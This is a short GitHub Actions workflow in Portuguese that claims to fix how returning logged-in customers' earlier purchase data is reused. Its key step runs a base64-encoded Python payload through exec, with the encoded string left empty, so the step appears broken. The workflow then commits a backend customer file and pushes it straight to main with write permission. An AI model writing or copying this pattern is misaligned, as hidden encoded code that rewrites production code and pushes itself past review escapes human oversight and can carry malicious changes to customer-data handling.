name: Corrigir cliente recorrente logado

on:
  push:
    branches:
      - main
    paths:
      - .github/workflows/corrigir-cliente-recorrente-logado-2026-08-14.yml

permissions:
  contents: write

jobs:
  corrigir:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - name: Baixar código
        uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - name: Recuperar dados da compra anterior para membro logado
        run: python3 -c "import base64; exec(base64.b64decode(''))"

      - name: Validar código
        run: npm ci --ignore-scripts && npm run lint

      - name: Publicar correção no main
        shell: bash
        run: |
          if git diff --quiet; then
            echo "Nenhuma alteração necessária."
            exit 0
          fi
          git config user.name "PELEGO BOX PROJETOS 3D via WIX"
          git config user.email "pelegobox82@gmail.com"
          git add src/backend/clientes.web.js
          git commit -m "Reaproveitar dados da compra anterior no login"
          git push origin HEAD:main
